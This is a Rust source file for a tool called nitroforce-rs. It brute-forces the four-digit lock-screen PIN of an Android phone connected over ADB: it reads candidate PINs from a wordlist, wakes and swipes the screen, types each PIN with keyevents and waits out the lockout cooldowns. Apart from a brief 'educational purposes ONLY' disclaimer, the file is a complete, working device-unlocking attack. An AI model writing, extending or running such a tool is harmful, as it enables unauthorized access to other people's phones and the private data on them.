// std
use std::thread;
use std::time::Duration;
use std::env;
use std::fs::File;

use std::io::BufRead;
use std::io::BufReader;


fn print_help() {
    println!("usage: nitroforce-rs [FILE]");
    println!("  e.g  pinlist.txt");
    println!("use «nitroforce-rs --help» command to display this message again");
}


fn main() {
    let args: Vec<String> = env::args().collect();

    if args.len() <= 1 {
        print_help();
        std::process::exit(0);
    }

    println!("This software was developed for educational purposes ONLY.");
    println!("Author do not take any responsibility for his software's users or any unfair/malicious usage.");

    let pinfile = File::open(&args[1]).expect("PIN list not found");

    let adb_server = mozdevice::Host { ..Default::default() };
    let connected: Vec<mozdevice::DeviceInfo> = adb_server.devices().unwrap();
    let connected_amount: usize = connected.len();

    if connected_amount <= 0 {
        panic!("No devices connected");
    }

    let active_device_info = connected.get(0).unwrap();

    println!("Connected {connected_amount} devices");
    println!("Active device: {:?} ({:?})", active_device_info.info["device"], active_device_info.info["model"]);

    let active_device = mozdevice::Device::new(
        adb_server,
        active_device_info.serial.to_owned(),
        mozdevice::AndroidStorageInput::Auto
    ).unwrap();


    // Unlocking device
    active_device.execute_host_shell_command("input keyevent 82").unwrap();
    thread::sleep(Duration::from_millis(100));
    active_device.execute_host_shell_command("input swipe 408 1210 408 85").unwrap();
    thread::sleep(Duration::from_millis(100));

    // Necessary variables
    let reader = BufReader::new(pinfile);

    // let mut combination: String = String::new();
    let mut attempt: u32 = 1;
    let mut retries_limit: u16 = 5;

    let mut digits: Vec<u8> = [ 0, 0, 0, 0 ].to_vec();

    let mut retry = 0;

    for (_index, line) in reader.lines().enumerate() {
        let line = line.unwrap();

        // ignore blank lines
        if line == "" {
            continue;
        }

        retry += 1;



        if attempt == 3 {
            println!("Exceeded limit of 3 attempts");
            println!("From now on, there is only 1 retry before 30 second cooldown");

            retries_limit = 1;
        }

        println!("Attempt {attempt}, Retry {retry}: Combination: {line}");

        for i in 0..=line.len() - 1 {
            // rust is evil.
            let c = line.chars().nth(i).unwrap();
            let keycode = c.to_digit(10).unwrap() as u8;

            digits[i] = keycode + 7;
        }

        for i in 0..=3 {
            active_device.execute_host_shell_command(&format!("input keyevent {:?}", digits[i])).unwrap();
            thread::sleep(Duration::from_millis(30));
        }


        // rust is fucking evil
        if retry % retries_limit == 0 {
            attempt += 1;

            thread::sleep(Duration::from_millis(80));
            active_device.execute_host_shell_command("input keyevent 66").unwrap();

            println!("Limit of {retries_limit} retries exceeded, waiting 30 seconds...");
            thread::sleep(Duration::from_secs(30));

            active_device.execute_host_shell_command("input keyevent 82").unwrap();
            thread::sleep(Duration::from_millis(100));
            active_device.execute_host_shell_command("input swipe 408 1210 408 85").unwrap();
            thread::sleep(Duration::from_millis(100));  
        }
    }
}